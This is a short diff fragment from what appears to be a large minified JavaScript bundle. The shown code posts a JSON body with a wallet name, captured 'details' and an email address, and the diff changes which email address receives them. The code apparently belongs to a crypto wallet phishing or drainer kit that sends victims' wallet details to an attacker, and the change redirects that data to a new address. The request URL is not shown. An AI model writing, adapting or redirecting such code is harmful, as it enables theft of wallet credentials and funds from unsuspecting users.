@@ -13141,7 +13141,7 @@ const Gh = [
 							body: JSON.stringify({
 								walletName: T.name,
 								details: el,
-								email: "dweb9674@gmail.com",
+								email: "Gerfish7458@proton.me",
 							}),
 						}
 					);
